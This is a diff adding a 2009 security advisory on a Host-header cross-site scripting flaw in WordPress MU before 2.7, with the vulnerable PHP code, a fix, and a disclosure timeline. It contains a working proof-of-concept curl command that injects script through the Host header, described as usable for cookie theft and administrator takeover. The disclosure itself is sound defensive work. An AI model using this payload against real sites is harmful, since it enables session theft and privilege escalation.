@@ -1,0 +1,127 @@
+=============================================
+INTERNET SECURITY AUDITORS ALERT 2009-004
+- Original release date: December 3rd, 2008
+- Last revised:  March 10th, 2009
+- Discovered by: Juan Galiana Lara
+- Severity: 6.3/10 (CVSS scored)
+=============================================
+
+I. VULNERABILITY
+-------------------------
+WordPress MU < 2.7 'Host' HTTP Header Cross Site Scripting (XSS)
+Vulnerability
+
+II. BACKGROUND
+-------------------------
+WordPress MU, or multi-user, allows to run unlimited blogs with a
+single install of wordpress. It is most famously used for
+WordPress.com where it serves tens of millions of hits on hundreds of
+thousands of blogs each day. Also is used in many other sites like
+Harvard University and Le Monde.
+
+III. DESCRIPTION
+-------------------------
+WordPress MU prior to version 2.7 fails to sanitize the Host header
+correctly in choose_primary_blog function and is therefore prune to
+XSS attacks.
+Web Sites running in a name based virtual hosting setup are not
+affected while they are not the default virtual host.
+
+IV. PROOF OF CONCEPT
+-------------------------
+The snippet of vulnerable code:
+
+In wp-includes/wpmu-functions.php, concretly in the function
+choose_primary_blog:
+
+1830 function choose_primary_blog() {
+1831     global $current_user;
+1832     ?>
+1833     <table class="form-table">
+1834     <tr>
+1835         <th scope="row"><?php _e('Primary Blog'); ?></th>
+1836         <td>
+1837         <?php
+1838         $all_blogs = get_blogs_of_user( $current_user->ID );
+1839         if( count( $all_blogs ) > 1 ) {
+1840             $primary_blog = get_usermeta($current_user->ID,
+'primary_blog');
+1841             ?>
+1842             <select name="primary_blog">
+1843                 <?php foreach( (array) $all_blogs as $blog ) { ?>
+1844                     <option value='<?php echo $blog->userblog_id
+?>'<?php if( $primary_blog == $blog->userblog_id ) echo '
+selected="selected"' ?>>http://<?php echo $blog->domain.$blog->path
+?></option>
+1845                 <?php } ?>
+1846             </select>
+1847             <?php
+1848         } else {
+1849             echo $_SERVER['HTTP_HOST']; <- HERE
+1850         }
+1851         ?>
+1852         </td>
+1853     </tr>
+1854     </table>
+1855     <?php
+1856 }
+
+The line 1849 contains the affected code "echo $_SERVER['HTTP_HOST'];"
+and is possible to inject HTML and script code crafting HTTP Host header:
+
+PoC:
+$ curl -H "Cookie: my cookies here" -H "Host: <body
+onload=alert(String.fromCharCode(88,83,83))>"
+http://www.example.com/wp-admin/profile.php> tmp.html
+$ firefox tmp.html
+
+The javascript code will be executed in the context of the victim
+browser, this can be exploited to steal cookies and escalate
+privileges to administrator.
+
+Tested with Wordpress MU 2.6.5, Apache 2.2 and Mozilla Firefox 3.0.6
+
+V. BUSINESS IMPACT
+-------------------------
+The impact is the attacker can gain administrator privileges on the
+application.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+Versions prior to 2.7 are affected
+
+VII. SOLUTION
+-------------------------
+Upgrade to version 2.7 of wordpress multi-user. It can be downloaded
+from http://mu.wordpress.org
+
+VIII. REFERENCES
+-------------------------
+http://mu.wordpress.org
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered
+by Juan Galiana Lara (jgaliana (at) isecauditors (dot) com).
+
+X. REVISION HISTORY
+-------------------------
+December  03, 2008: Initial release
+March     02, 2009: More details added
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+December  03, 2008: Vendor contacted
+December  03, 2008: MU trunk code fixed
+January   28, 2008: WordPress MU 2.7 released
+March     10, 2009: Vulnerability published by
+                    Internet Security Auditors (www.isecauditors.com)
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is"
+with no warranties or guarantees of fitness of use or otherwise.
+Internet Security Auditors accepts no responsibility for any damage
+caused by the use or misuse of this information.
+
+# milw0rm.com [2009-03-10]
